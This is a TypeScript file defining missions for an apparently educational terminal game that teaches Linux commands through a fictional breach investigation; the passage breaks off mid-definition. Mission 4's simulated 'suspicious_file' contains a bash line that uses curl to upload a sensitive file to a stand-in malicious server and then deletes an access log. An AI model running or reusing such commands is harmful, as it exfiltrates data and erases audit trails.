import type { Mission, MissionDirectory, MissionFile } from "../types/mission";

interface FileSystemStructure {
	[key: string]:
		| FileSystemStructure
		| { content: string; permissions?: string };
}

function createFilesystem(rootContents: FileSystemStructure): MissionDirectory {
	function parseDirectory(
		name: string,
		contents: FileSystemStructure,
	): MissionDirectory {
		const files: MissionFile[] = [];
		const subdirectories: MissionDirectory[] = [];

		Object.entries(contents).forEach(([key, value]) => {
			if (typeof value === "object" && value !== null && "content" in value) {
				files.push({
					name: key,
					content: value.content as string,
					hidden: key.startsWith("."),
					permissions:
						(value as { content: string; permissions?: string }).permissions ||
						"644",
				});
			} else if (typeof value === "object" && value !== null) {
				subdirectories.push(parseDirectory(key, value as FileSystemStructure));
			}
		});

		return { name, files, subdirectories };
	}

	return parseDirectory("root", rootContents);
}

export const LEVEL1_MISSIONS: Mission[] = [
	{
		id: "mission_01",
		title: "The Missing Files",
		difficulty: 1,
		description:
			"Important company files have vanished. Use basic commands to locate them.",
		briefing: {
			story: [
				"Detective, we have a situation.",
				"",
				"A bunch of secret company files have disappeared from the server.",
				"The IT department has no idea what happened, backup was not made, and management is breathing down our necks.",
				"We need someone to track those files down ASAP.",
			],
			task: "Learn essential file navigation commands to locate the missing files.",
			instructions: [
				"Master the basic commands: ls, cd, pwd, and cat.",
				"These are the foundation of all terminal investigations.",
			],
		},
		objectives: [
			{
				id: "list_contents",
				description: "List the contents of the current directory",
				hint: 'You can use "ls" to see what files and folders are available',
				completed: false,
				requiredCommand: "ls",
				validator: {
					type: "args-output",
					fn: (_args: string, output: string) => {
						return output.includes("evidence") && output.includes("suspects");
					},
				},
			},
			{
				id: "navigate_evidence",
				description: "Navigate into the evidence directory",
				hint: 'You can use "cd" to change into the evidence folder',
				completed: false,
				requiredCommand: "cd",
				validator: {
					type: "args-output",
					fn: (args: string, _output: string) => {
						return args.includes("evidence");
					},
				},
			},
			{
				id: "check_location",
				description: "Confirm your current location",
				hint: 'You can use "pwd" to see your current directory path',
				completed: false,
				requiredCommand: "pwd",
				validator: {
					type: "args-output",
					fn: (_args: string, output: string) => {
						return output.includes("/evidence");
					},
				},
			},
			{
				id: "read_case_file",
				description: "Read the contents of case_file.txt",
				hint: 'You can use "cat" to display file contents',
				completed: false,
				requiredCommand: "cat",
				validator: {
					type: "args-output",
					fn: (args: string, output: string) => {
						return (
							args.includes("case_file.txt") &&
							output.includes("Case #2024-001")
						);
					},
				},
			},
		],
		filesystem: createFilesystem({
			evidence: {
				"case_file.txt": {
					content: `CONFIDENTIAL CASE FILE
Case #2024-001: Missing Financial Records

Date: January 15, 2024
Investigator: Detective Terminal

SUMMARY:
Three critical financial files have been reported missing:
- quarterly_report.xlsx
- budget_2024.pdf  
- expense_records.csv

LEADS:
1. Last seen in the company shared drive
2. May have been moved to backup locations
3. Check with IT department for recent file movements

NEXT STEPS:
Continue investigation using advanced search techniques.
The missing files contain sensitive financial data that must be recovered.`,
				},
				witness_statements: {
					"employee_01.txt": {
						content: `WITNESS STATEMENT - Employee #001
Name: Sarah Johnson, Accounting Manager
Date: January 15, 2024

"I was working on the quarterly report yesterday around 3 PM. 
The files were definitely in the shared folder at that time. 
When I came in this morning, they were gone. 
I haven't moved them anywhere - this is very concerning."`,
					},
					"employee_02.txt": {
						content: `WITNESS STATEMENT - Employee #002  
Name: Mike Chen, IT Specialist
Date: January 15, 2024

"I ran a system backup around midnight last night.
The backup process completed successfully, but I noticed
some unusual file access patterns in the logs.
Someone or something was accessing files in the finance folder
between 11 PM and 2 AM when no one should have been working."`,
					},
				},
			},
			suspects: {
				"README.txt": {
					content: `SUSPECTS DIRECTORY
This folder contains information about potential suspects
in the missing files case.

Use 'ls' to see available suspect files.
Use 'cat filename' to read suspect information.`,
				},
				"suspect_alpha.txt": {
					content: `SUSPECT: ALPHA
Classification: Internal Threat
Risk Level: Medium

Recent unusual activity detected:
- Late night access to financial systems
- Multiple failed login attempts  
- Access from unusual IP addresses

Recommendation: Continue monitoring`,
				},
			},
		}),
		allowedCommands: ["ls", "cd", "pwd", "cat", "help"],
		newCommands: ["ls", "cd", "pwd", "cat"],
		unlocked: true,
		completed: false,
		successMessage: [
			"Excellent work, Detective!",
			"",
			"You've mastered the basic navigation commands:",
			"• ls - List directory contents",
			"• cd - Change directory",
			"• pwd - Print working directory",
			"• cat - Display file contents",
			"",
			"These commands are your foundation for all terminal investigations.",
			"The case file reveals our first leads about the missing financial records.",
			"",
			"Skills Acquired: ls, cd, pwd, cat",
			'Next mission unlocked: "The Hidden Clues"',
		],
	},

	{
		id: "mission_02",
		title: "The Hidden Clues",
		difficulty: 1,
		description:
			"Hidden files may contain crucial evidence. Learn to reveal what's concealed.",
		briefing: {
			story: [
				"Nice work on the first case, Detective.",
				"",
				"Our investigation revealed that someone has been hiding files on the system.",
				"Standard directory listings won't show everything we need to see.",
				"We must uncover what's been deliberately concealed.",
			],
			task: "Master advanced listing commands to reveal hidden files and get detailed information.",
			instructions: [
				"Learn to use ls with various options to see hidden files.",
				"Practice getting detailed file information that reveals timestamps and permissions.",
			],
		},
		objectives: [
			{
				id: "show_hidden_files",
				description: "Reveal hidden files in the current directory",
				hint: 'Use "ls -a" to show all files, including those starting with dots',
				completed: false,
				requiredCommand: "ls",
				validator: {
					type: "args-output",
					fn: (args: string, output: string) => {
						return args.includes("-a") && output.includes(".hidden_evidence");
					},
				},
			},
			{
				id: "detailed_listing",
				description: "Get detailed information about all files",
				hint: 'Use "ls -la" to show detailed info for all files including hidden ones',
				completed: false,
				requiredCommand: "ls",
				validator: {
					type: "args-output",
					fn: (args: string, output: string) => {
						return (
							args.includes("-l") &&
							args.includes("-a") &&
							output.includes("Jan 15")
						);
					},
				},
			},
			{
				id: "read_hidden_file",
				description: "Read the contents of the hidden evidence file",
				hint: 'Use "cat .hidden_evidence" to read the hidden file',
				completed: false,
				requiredCommand: "cat",
				validator: {
					type: "args-output",
					fn: (args: string, output: string) => {
						return (
							args.includes(".hidden_evidence") && output.includes("CLASSIFIED")
						);
					},
				},
			},
			{
				id: "explore_hidden_directory",
				description: "Navigate into the hidden backup directory",
				hint: 'Use "cd .backup" to enter the hidden directory',
				completed: false,
				requiredCommand: "cd",
				validator: {
					type: "args-output",
					fn: (args: string, _output: string) => {
						return args.includes(".backup");
					},
				},
			},
			{
				id: "find_recovered_files",
				description:
					"List the contents of the backup directory to find recovered files",
				hint: 'Use "ls" in the backup directory to see what files were recovered',
				completed: false,
				requiredCommand: "ls",
				validator: {
					type: "args-output",
					fn: (_args: string, output: string) => {
						return (
							output.includes("quarterly_report.xlsx") &&
							output.includes("budget_2024.pdf")
						);
					},
				},
			},
		],
		filesystem: createFilesystem({
			".hidden_evidence": {
				content: `CLASSIFIED EVIDENCE LOG
Security Level: Restricted Access Only

DISCOVERY:
Hidden backup system found in .backup directory
Contains copies of the missing financial files
Timestamps indicate files were copied at 1:47 AM

ANALYSIS:
- Files were not deleted, but moved to hidden location
- Backup was created automatically by security protocol
- Original disappearance may have been system maintenance

CONCLUSION:
Missing files located in hidden backup directory.
Case status: Files recovered successfully.`,
			},
			".backup": {
				"quarterly_report.xlsx": {
					content: `QUARTERLY FINANCIAL REPORT - Q4 2024
======================================

Revenue: $2,450,000
Expenses: $1,980,000
Net Profit: $470,000

Growth Rate: 12.5% over Q3
Department Performance:
- Sales: +15%
- Marketing: +8%
- Operations: -2%

This file was automatically backed up by the security system.`,
				},
				"budget_2024.pdf": {
					content: `ANNUAL BUDGET 2024
==================

Total Allocated Budget: $8,500,000

Department Allocations:
- Engineering: $3,200,000
- Sales & Marketing: $2,800,000  
- Operations: $1,500,000
- Administration: $1,000,000

Reserve Fund: $500,000 (5.9% of total)

This document contains sensitive financial information.
Backup created: January 15, 2024 at 1:47 AM`,
				},
				"expense_records.csv": {
					content: `Date,Department,Description,Amount
2024-01-01,Engineering,Software Licenses,$15000
2024-01-05,Marketing,Campaign Launch,$25000
2024-01-10,Operations,Equipment Purchase,$8500
2024-01-12,Administration,Office Rent,$12000
2024-01-15,Engineering,Cloud Services,$6500

Total Expenses Tracked: $67,000
Last Updated: January 15, 2024
Backup Status: Secured`,
				},
				"backup_log.txt": {
					content: `AUTOMATED BACKUP LOG
===================
Timestamp: 2024-01-15 01:47:23

BACKUP PROCESS INITIATED:
Source: /company/finance/
Destination: /.backup/
Trigger: Security protocol #447

FILES PROCESSED:
✓ quarterly_report.xlsx (copied)
✓ budget_2024.pdf (copied) 
✓ expense_records.csv (copied)

BACKUP COMPLETED SUCCESSFULLY
Next scheduled backup: 2024-01-16 01:47:23`,
				},
			},
			investigation_notes: {
				"timeline.txt": {
					content: `INVESTIGATION TIMELINE
=====================

11:00 PM - System maintenance begins
11:30 PM - Files moved from main directory  
01:47 AM - Automated backup creates copies
02:15 AM - Maintenance complete, files archived
08:00 AM - Employees report missing files
09:30 AM - Investigation launched

CONCLUSION: Files were moved during routine maintenance
and safely backed up in hidden directory.`,
				},
			},
		}),
		allowedCommands: ["ls", "cd", "pwd", "cat", "help"],
		newCommands: ["ls -a", "ls -l", "ls -la"],
		unlocked: false,
		completed: false,
		successMessage: [
			"Outstanding Detective Work!",
			"",
			"You've uncovered the hidden evidence using advanced ls commands:",
			"• ls -a - Shows all files, including hidden ones starting with '.'",
			"• ls -l - Displays detailed file information (permissions, dates, sizes)",
			"• ls -la - Combines both options for complete visibility",
			"",
			"Mystery solved! The missing files were safely backed up by the security system.",
			"All financial records have been recovered and accounted for.",
			"",
			"Skills Acquired: ls -a, ls -l, ls -la, hidden file detection",
			'Next mission unlocked: "The Whistleblower"',
		],
	},

	{
		id: "mission_03",
		title: "The Search Operation",
		difficulty: 1,
		description:
			"Master file searching techniques to track down evidence scattered across the system.",
		briefing: {
			story: [
				"Detective, we have a new challenge.",
				"",
				"Evidence is scattered across multiple directories in the system.",
				"Manual navigation would take hours we don't have.",
				"We need efficient search techniques to locate specific files and content.",
			],
			task: "Learn powerful search commands to find files and search within their contents.",
			instructions: [
				"Master the find command for locating files by name and type.",
				"Learn grep to search for specific content within files.",
			],
		},
		objectives: [
			{
				id: "find_by_name",
				description: "Find all files with 'evidence' in their name",
				hint: 'Use "find . -name \'*evidence*\'" to search for files containing "evidence"',
				completed: false,
				requiredCommand: "find",
				validator: {
					type: "args-output",
					fn: (args: string, output: string) => {
						return (
							args.includes("-name") &&
							args.includes("evidence") &&
							output.includes("secret_evidence.txt")
						);
					},
				},
			},
			{
				id: "find_by_type",
				description: "Find all text files in the system",
				hint: "Use \"find . -name '*.txt'\" to find all .txt files",
				completed: false,
				requiredCommand: "find",
				validator: {
					type: "args-output",
					fn: (args: string, output: string) => {
						return (
							args.includes("-name") &&
							args.includes("*.txt") &&
							output.includes("report.txt")
						);
					},
				},
			},
			{
				id: "search_content_password",
				description: "Search for files containing the word 'password'",
				hint: 'Use "grep -r password ." to search for "password" in all files',
				completed: false,
				requiredCommand: "grep",
				validator: {
					type: "args-output",
					fn: (args: string, output: string) => {
						return (
							args.includes("-r") &&
							args.includes("password") &&
							output.includes("admin123")
						);
					},
				},
			},
			{
				id: "search_content_case_insensitive",
				description: "Search for 'CONFIDENTIAL' in any case variation",
				hint: 'Use "grep -ri confidential ." for case-insensitive search',
				completed: false,
				requiredCommand: "grep",
				validator: {
					type: "args-output",
					fn: (args: string, output: string) => {
						return (
							args.includes("-ri") &&
							args.includes("confidential") &&
							output.includes("top secret")
						);
					},
				},
			},
			{
				id: "count_matches",
				description: "Count how many files contain the word 'suspect'",
				hint: 'Use "grep -rc suspect ." to count matches in each file',
				completed: false,
				requiredCommand: "grep",
				validator: {
					type: "args-output",
					fn: (args: string, output: string) => {
						return (
							args.includes("-rc") &&
							args.includes("suspect") &&
							output.includes(":3")
						);
					},
				},
			},
		],
		filesystem: createFilesystem({
			documents: {
				"report.txt": {
					content: `INVESTIGATION REPORT
==================
Date: January 16, 2024

The suspect was seen near the server room at approximately 2:30 AM.
Security cameras captured suspicious activity involving file access.
Further investigation required to determine motive.

This document contains confidential information.`,
				},
				"evidence_log.txt": {
					content: `EVIDENCE COLLECTION LOG
======================

Item #001: Security footage from main entrance
Item #002: Server access logs showing unauthorized entry
Item #003: Suspect fingerprints found on keyboard

All evidence properly catalogued and secured.
Chain of custody maintained throughout investigation.`,
				},
				"secret_evidence.txt": {
					content: `CLASSIFIED - TOP SECRET
======================

Internal investigation reveals potential data breach.
Suspect may have accessed confidential financial records.
Password compromise suspected: admin123 found in logs.

URGENT: Change all system passwords immediately.
Implement additional security protocols.`,
				},
			},
			logs: {
				"access.log": {
					content: `SERVER ACCESS LOG
================
2024-01-16 02:28:15 - User login: admin (password: admin123)
2024-01-16 02:30:22 - File access: /finance/quarterly_report.xlsx
2024-01-16 02:31:45 - File access: /finance/budget_2024.pdf
2024-01-16 02:33:18 - User logout: admin
2024-01-16 02:35:02 - Unauthorized access attempt detected

CONFIDENTIAL: This log contains sensitive security information.`,
				},
				"security.log": {
					content: `SECURITY MONITORING LOG
======================
Alert Level: HIGH

Multiple failed login attempts detected.
Suspect user account: guest_user
Password brute force attack in progress.

Automated response: Account locked after 5 failed attempts.
System administrator notified.`,
				},
			},
			backup: {
				"system_backup.txt": {
					content: `SYSTEM BACKUP STATUS
===================

Daily backup completed successfully.
Files backed up: 1,247 files
Data size: 2.3 GB

Suspect activity noted during backup window.
Additional monitoring recommended.

This is a confidential system file.`,
				},
			},
			investigation: {
				"suspect_profile.txt": {
					content: `SUSPECT PROFILE - Case #2024-002
=================================

Name: Unknown
Access Level: Administrative
Last Seen: Server room, 2:30 AM

Behavioral Analysis:
- Familiar with system layout
- Knows password protocols  
- Possible insider threat

Investigation Status: Active
Priority: HIGH

The suspect appears to have extensive system knowledge.`,
				},
				"witness_interview.txt": {
					content: `WITNESS INTERVIEW TRANSCRIPT
===========================
Date: January 16, 2024
Witness: Night Security Guard

"I saw someone near the server room around 2:30 AM.
They had a key card and seemed to know exactly where to go.
The suspect was wearing dark clothing and a baseball cap.
They were only there for about 10 minutes."

Interview conducted by Detective Johnson.
This transcript is confidential.`,
				},
			},
		}),
		allowedCommands: ["ls", "cd", "pwd", "cat", "find", "grep", "help"],
		newCommands: ["find", "grep"],
		unlocked: false,
		completed: false,
		successMessage: [
			"Exceptional Search Work!",
			"",
			"You've mastered essential search commands:",
			"• find - Locate files by name, type, and other criteria",
			"• grep -r - Search for text content recursively through directories",
			"• grep -i - Case-insensitive searching",
			"• grep -c - Count matching lines",
			"",
			"Your investigation uncovered:",
			"- Password compromise: admin123 found in multiple locations",
			"- Suspect activity between 2:28-2:35 AM",
			"- Potential insider threat with administrative access",
			"",
			"Skills Acquired: find, grep, advanced search techniques",
			'Next mission unlocked: "The File Detective"',
		],
	},

	{
		id: "mission_04",
		title: "The File Detective",
		difficulty: 1,
		description:
			"Learn advanced file examination techniques to analyze file properties and contents.",
		briefing: {
			story: [
				"Detective, our investigation has deepened.",
				"",
				"We need to examine files more thoroughly - not just read them, but understand their properties.",
				"File sizes, modification dates, and content structure may reveal crucial evidence.",
				"Time to upgrade your investigation techniques.",
			],
			task: "Master file analysis commands to examine file properties and manipulate file contents.",
			instructions: [
				"Learn to use head and tail to examine specific parts of files.",
				"Master wc to count lines, words, and characters in files.",
				"Use file command to determine file types.",
			],
		},
		objectives: [
			{
				id: "examine_file_start",
				description: "Read the first 10 lines of the large log file",
				hint: 'Use "head server_log.txt" to see the beginning of the file',
				completed: false,
				requiredCommand: "head",
				validator: {
					type: "args-output",
					fn: (args: string, output: string) => {
						return (
							args.includes("server_log.txt") && output.includes("SERVER START")
						);
					},
				},
			},
			{
				id: "examine_file_end",
				description: "Read the last 10 lines to see the most recent entries",
				hint: 'Use "tail server_log.txt" to see the end of the file',
				completed: false,
				requiredCommand: "tail",
				validator: {
					type: "args-output",
					fn: (args: string, output: string) => {
						return (
							args.includes("server_log.txt") &&
							output.includes("CRITICAL ALERT")
						);
					},
				},
			},
			{
				id: "count_file_contents",
				description: "Count the lines, words, and characters in evidence.txt",
				hint: 'Use "wc evidence.txt" to get word count statistics',
				completed: false,
				requiredCommand: "wc",
				validator: {
					type: "args-output",
					fn: (args: string, output: string) => {
						return args.includes("evidence.txt") && output.includes("25");
					},
				},
			},
			{
				id: "identify_file_type",
				description: "Determine the type of the suspicious_file",
				hint: 'Use "file suspicious_file" to identify what type of file it is',
				completed: false,
				requiredCommand: "file",
				validator: {
					type: "args-output",
					fn: (args: string, output: string) => {
						return (
							args.includes("suspicious_file") && output.includes("executable")
						);
					},
				},
			},
			{
				id: "examine_specific_lines",
				description: "Read exactly lines 15-20 of the investigation_notes.txt",
				hint: 'Use "head -20 investigation_notes.txt | tail -6" to get lines 15-20',
				completed: false,
				requiredCommand: "head",
				validator: {
					type: "args-output",
					fn: (args: string, output: string) => {
						return args.includes("-20") && output.includes("BREAKTHROUGH");
					},
				},
			},
		],
		filesystem: createFilesystem({
			"server_log.txt": {
				content: `SERVER START - January 16, 2024 00:00:01
System initialization complete
Database connection established
Web services started on port 80
SSL certificates loaded successfully
Security monitoring activated
User authentication system online
File system mounted and ready
Backup services initialized
Network interfaces configured
Firewall rules applied
Intrusion detection system active
...
[2000 lines of server activity]
...
02:28:15 - UNUSUAL: Administrative login from unknown location
02:29:43 - WARNING: Multiple file access attempts
02:31:22 - ALERT: Sensitive files accessed
02:33:07 - ERROR: Unauthorized data export detected
02:35:45 - CRITICAL ALERT: Security breach confirmed`,
			},
			"evidence.txt": {
				content: `DIGITAL EVIDENCE ANALYSIS
========================
Case Number: 2024-003
Date: January 16, 2024
Investigator: Detective Digital

FINDINGS:
The suspicious file found on the server appears to be a 
custom executable designed for data extraction.
Binary analysis reveals:
- Compiled on January 15, 2024
- Contains network communication modules
- Encrypted payload suggesting malicious intent
- Matches known malware signatures

RECOMMENDATION:
Immediate quarantine of affected systems required.
Full forensic analysis of all network traffic.
Contact cybersecurity team for advanced threat assessment.

CLASSIFICATION: CONFIDENTIAL
Total Evidence Items: 7
Threat Level: HIGH`,
			},
			"investigation_notes.txt": {
				content: `INVESTIGATION PROGRESS NOTES
===========================
Day 1: Initial breach detected
Day 2: Forensic team deployed
Day 3: Network analysis begun
Day 4: Malware samples collected
Day 5: Threat actor identification started
Day 6: Evidence correlation in progress
Day 7: Legal team briefed
Day 8: Additional security measures implemented
Day 9: System hardening completed
Day 10: Monitoring protocols enhanced
Day 11: User training updated
Day 12: Incident response plan revised
Day 13: Backup verification completed  
Day 14: Recovery procedures tested
Day 15: BREAKTHROUGH - Suspect identified through network forensics
Day 16: Arrest warrant prepared
Day 17: Coordination with law enforcement
Day 18: Final evidence package assembled
Day 19: Case presentation scheduled
Day 20: Investigation concluded successfully`,
			},
			suspicious_file: {
				content: `#!/bin/bash
# This is actually a shell script disguised as a binary
# It would appear as executable when using the 'file' command

echo "Extracting sensitive data..."
curl -X POST https://malicious-server.com/upload -d @/sensitive/data.txt
rm -f /var/log/access.log
echo "Cleanup complete"`,
			},
			file_analysis: {
				"metadata.txt": {
					content: `FILE METADATA ANALYSIS
=====================

suspicious_file:
- Size: 247 bytes
- Modified: January 15, 2024 23:45:32
- Permissions: 755 (executable)
- Type: Bash script
- MD5 Hash: d41d8cd98f00b204e9800998ecf8427e

evidence.txt:
- Size: 1,247 bytes  
- Lines: 25
- Words: 178
- Characters: 1,247
- Type: Plain text

server_log.txt:
- Size: 127,456 bytes
- Lines: 2,847
- Type: Log file
- Contains critical security alerts`,
				},
			},
		}),
		allowedCommands: [
			"ls",
			"cd",
			"pwd",
			"cat",
			"head",
			"tail",
			"wc",
			"file",
			"help",
		],
		newCommands: ["head", "tail", "wc", "file"],
		unlocked: false,
		completed: false,
		successMessage: [
			"Brilliant File Analysis!",
			"",
			"You've mastered advanced file examination techniques:",
			"• head - Read the beginning of files (first N lines)",
			"• tail - Read the end of files (last N lines)",
			"• wc - Count lines, words, and characters in files",
			"• file - Identify file types and formats",
			"",
			"Key discoveries from your analysis:",
			"- Suspicious file is actually a malicious bash script",
			"- Server logs show clear evidence of the security breach",
			"- 25 lines of evidence documented the investigation progress",
			"",
			"Skills Acquired: head, tail, wc, file, forensic file analysis",
			'Next mission unlocked: "The Permission Problem"',
		],
	},

	{
		id: "mission_05",
		title: "The Permission Problem",
		difficulty: 1,
		description:
			"Investigate file permission irregularities that may indicate security compromises.",
		briefing: {
			story: [
				"Detective, we've discovered a new angle to our investigation.",
				"",
				"Some files have unusual permissions that don't match company security policies.",
				"File permissions can reveal how attackers gained access or covered their tracks.",
				"We need to understand and fix these permission issues.",
			],
			task: "Master file permission commands to investigate and secure file access.",
			instructions: [
				"Learn to read file permissions using ls -l output.",
				"Master chmod to modify file permissions appropriately.",
				"Understand how permissions relate to security.",
			],
		},
		objectives: [
			{
				id: "examine_permissions",
				description:
					"List detailed permissions for all files in the security directory",
				hint: 'Use "ls -l" in the security directory to see file permissions',
				completed: false,
				requiredCommand: "ls",
				validator: {
					type: "args-output",
					fn: (args: string, output: string) => {
						return (
							args.includes("-l") &&
							output.includes("rwxrwxrwx") &&
							output.includes("secret.txt")
						);
					},
				},
			},
			{
				id: "secure_secret_file",
				description: "Remove world-write permissions from secret.txt",
				hint: 'Use "chmod 644 secret.txt" to set safe permissions (owner: read/write, others: read only)',
				completed: false,
				requiredCommand: "chmod",
				validator: {
					type: "args-output",
					fn: (args: string, _output: string) => {
						return args.includes("644") && args.includes("secret.txt");
					},
				},
			},
			{
				id: "make_script_executable",
				description: "Make the security_check.sh script executable",
				hint: 'Use "chmod +x security_check.sh" to add execute permissions',
				completed: false,
				requiredCommand: "chmod",
				validator: {
					type: "args-output",
					fn: (args: string, _output: string) => {
						return args.includes("+x") && args.includes("security_check.sh");
					},
				},
			},
			{
				id: "verify_changes",
				description: "Verify that permission changes were applied correctly",
				hint: 'Use "ls -l" again to confirm the permission changes',
				completed: false,
				requiredCommand: "ls",
				validator: {
					type: "args-output",
					fn: (args: string, output: string) => {
						return (
							args.includes("-l") &&
							output.includes("rw-r--r--") &&
							output.includes("rwxr-xr-x")
						);
					},
				},
			},
			{
				id: "find_unsafe_permissions",
				description: "Find all files with world-writable permissions",
				hint: 'Use "find . -perm -002" to find files writable by everyone',
				completed: false,
				requiredCommand: "find",
				validator: {
					type: "args-output",
					fn: (args: string, output: string) => {
						return (
							args.includes("-perm") &&
							args.includes("-002") &&
							output.includes("vulnerable.txt")
						);
					},
				},
			},
		],
		filesystem: createFilesystem({
			security: {
				"secret.txt": {
					content: `TOP SECRET SECURITY DOCUMENT
===========================
Classification: CONFIDENTIAL

This file contains sensitive security information including:
- Administrative passwords  
- Network security keys
- Emergency access codes

WARNING: This file has dangerous permissions (777 - world writable)!
Anyone on the system can read, write, or delete this file.
This is a serious security vulnerability.

Recommended action: Change permissions to 644 immediately.`,
					permissions: "777",
				},
				"security_check.sh": {
					content: `#!/bin/bash
# Security Check Script
# This script should be executable to run properly

echo "Starting security audit..."
echo "Checking file permissions..."

# Check for world-writable files
echo "World-writable files found:"
find . -perm -002 -type f

echo "Security check complete."
echo "Review any files listed above for permission issues."`,
					permissions: "644",
				},
				"vulnerable.txt": {
					content: `VULNERABILITY REPORT
===================
Date: January 16, 2024

This file demonstrates poor security practices:
- World-writable permissions allow anyone to modify content
- Sensitive information stored without proper access controls
- No encryption or additional security measures

This file represents exactly what NOT to do with sensitive data.`,
					permissions: "666",
				},
				"permissions_guide.txt": {
					content: `FILE PERMISSIONS GUIDE
=====================

Permission Format: rwxrwxrwx
- First three: Owner permissions (read, write, execute)
- Second three: Group permissions
- Third three: World permissions

Common Permission Numbers:
644 - Owner: read/write, Group/World: read only
755 - Owner: read/write/execute, Group/World: read/execute
600 - Owner: read/write only, no access for others
700 - Owner: full access, no access for others

Security Best Practices:
- Never use 777 (full access for everyone)
- Limit permissions to minimum required
- Regularly audit file permissions
- Scripts need execute permission (+x) to run`,
					permissions: "644",
				},
			},
			audit_results: {
				"permission_audit.txt": {
					content: `SECURITY PERMISSION AUDIT RESULTS
=================================
Date: January 16, 2024
Auditor: Security Team

CRITICAL FINDINGS:
1. secret.txt - Permissions 777 (CRITICAL RISK)
   - Contains sensitive passwords and keys
   - Readable and writable by all users
   - Immediate remediation required

2. vulnerable.txt - Permissions 666 (HIGH RISK)  
   - World-writable file with sensitive content
   - Potential for data tampering
   - Should be restricted to authorized users only

3. security_check.sh - Permissions 644 (MEDIUM RISK)
   - Security script not executable
   - Cannot run automated security checks
   - Add execute permissions for security team

RECOMMENDATIONS:
- Implement regular permission audits
- Apply principle of least privilege  
- Monitor for permission changes
- Train staff on security best practices`,
				},
			},
		}),
		allowedCommands: ["ls", "cd", "pwd", "cat", "chmod", "find", "help"],
		newCommands: ["chmod"],
		unlocked: false,
		completed: false,
		successMessage: [
			"Excellent Security Work!",
			"",
			"You've mastered file permission management:",
			"• chmod - Change file and directory permissions",
			"• ls -l - View detailed permission information",
			"• find -perm - Locate files with specific permissions",
			"",
			"Critical security improvements achieved:",
			"- Secured secret.txt from world-write access (777 → 644)",
			"- Made security script executable for automated checks",
			"- Identified all world-writable vulnerabilities",
			"",
			"Understanding permissions is crucial for system security.",
			"",
			"Skills Acquired: chmod, permission analysis, security hardening",
			'Next mission unlocked: "The Directory Detective"',
		],
	},

	{
		id: "mission_06",
		title: "The Directory Detective",
		difficulty: 1,
		description:
			"Master directory operations to organize evidence and create structured investigations.",
		briefing: {
			story: [
				"Detective, our case files are getting disorganized.",
				"",
				"Evidence is scattered, and we need better organization for court proceedings.",
				"Professional investigators create structured directory systems.",
				"Time to learn advanced directory management.",
			],
			task: "Master directory creation, copying, and organization commands.",
			instructions: [
				"Learn mkdir to create organized directory structures.",
				"Master cp to copy files and preserve evidence.",
				"Use mv to reorganize and rename files properly.",
			],
		},
		objectives: [
			{
				id: "create_case_structure",
				description:
					"Create a new directory called 'case_2024_004' for organizing evidence",
				hint: 'Use "mkdir case_2024_004" to create the new case directory',
				completed: false,
				requiredCommand: "mkdir",
				validator: {
					type: "args-output",
					fn: (args: string, _output: string) => {
						return args.includes("case_2024_004");
					},
				},
			},
			{
				id: "copy_evidence",
				description: "Copy important_evidence.txt to the new case directory",
				hint: 'Use "cp important_evidence.txt case_2024_004/" to copy the file',
				completed: false,
				requiredCommand: "cp",
				validator: {
					type: "args-output",
					fn: (args: string, _output: string) => {
						return (
							args.includes("important_evidence.txt") &&
							args.includes("case_2024_004")
						);
					},
				},
			},
			{
				id: "rename_file",
				description:
					"Rename the copied file to 'primary_evidence.txt' for clarity",
				hint: 'Use "mv case_2024_004/important_evidence.txt case_2024_004/primary_evidence.txt"',
				completed: false,
				requiredCommand: "mv",
				validator: {
					type: "args-output",
					fn: (args: string, _output: string) => {
						return (
							args.includes("important_evidence.txt") &&
							args.includes("primary_evidence.txt")
						);
					},
				},
			},
			{
				id: "create_subdirectories",
				description:
					"Create subdirectories 'witnesses', 'forensics', and 'timeline' in the case directory",
				hint: 'Use "mkdir case_2024_004/witnesses case_2024_004/forensics case_2024_004/timeline"',
				completed: false,
				requiredCommand: "mkdir",
				validator: {
					type: "args-output",
					fn: (args: string, _output: string) => {
						return (
							args.includes("witnesses") &&
							args.includes("forensics") &&
							args.includes("timeline")
						);
					},
				},
			},
			{
				id: "organize_files",
				description:
					"Move witness_statement.txt into the witnesses subdirectory",
				hint: 'Use "mv witness_statement.txt case_2024_004/witnesses/"',
				completed: false,
				requiredCommand: "mv",
				validator: {
					type: "args-output",
					fn: (args: string, _output: string) => {
						return (
							args.includes("witness_statement.txt") &&
							args.includes("witnesses")
						);
					},
				},
			},
			{
				id: "verify_organization",
				description:
					"List the contents of the case directory to verify organization",
				hint: 'Use "ls -la case_2024_004" to see the organized structure',
				completed: false,
				requiredCommand: "ls",
				validator: {
					type: "args-output",
					fn: (args: string, output: string) => {
						return (
							args.includes("case_2024_004") &&
							output.includes("primary_evidence.txt") &&
							output.includes("witnesses")
						);
					},
				},
			},
		],
		filesystem: createFilesystem({
			"important_evidence.txt": {
				content: `CRITICAL EVIDENCE - CASE 2024-004
==================================
Date Collected: January 17, 2024
Evidence Type: Digital Forensics

SUMMARY:
Network logs reveal unauthorized access to financial database.
Timestamp analysis shows access occurred outside business hours.
IP address traced to external location with VPN masking.

TECHNICAL DETAILS:
- Access Time: January 16, 2024 at 3:17 AM
- Duration: 43 minutes
- Files Accessed: 47 sensitive financial documents
- Data Exfiltrated: Approximately 2.3 GB

CHAIN OF CUSTODY:
Collected by: Detective Digital
Verified by: Forensics Team Lead
Stored: Secure evidence locker #A-47

This evidence is crucial for establishing criminal intent.`,
			},
			"witness_statement.txt": {
				content: `WITNESS STATEMENT - CASE 2024-004
=================================
Witness Name: Jennifer Martinez, IT Security Manager
Date: January 17, 2024
Time: 2:00 PM

STATEMENT:
"I was monitoring our security dashboard when I noticed unusual 
network activity around 3:00 AM on January 16th. The access 
patterns didn't match any of our authorized maintenance windows.

Someone was systematically accessing financial files - they knew 
exactly where to look. This wasn't random browsing; it was 
targeted data theft. The connection came from an IP address 
I didn't recognize, and they were using admin-level credentials.

I immediately alerted my manager and began collecting logs. 
We have complete network traces of the entire incident."

Witness Signature: [Jennifer Martinez]
Investigating Officer: Detective Terminal`,
			},
			case_files: {
				"investigation_checklist.txt": {
					content: `CASE ORGANIZATION CHECKLIST
==========================

Proper case organization is essential for:
✓ Maintaining chain of custody
✓ Court admissibility of evidence  
✓ Efficient investigation workflow
✓ Team collaboration

RECOMMENDED DIRECTORY STRUCTURE:
/case_YYYY_###/
├── primary_evidence.txt
├── witnesses/
│   ├── witness_statements
│   └── interview_transcripts
├── forensics/
│   ├── network_logs
│   ├── disk_images
│   └── malware_analysis
└── timeline/
    ├── chronology.txt
    └── event_correlation

This structure ensures all evidence is properly catalogued.`,
				},
			},
			templates: {
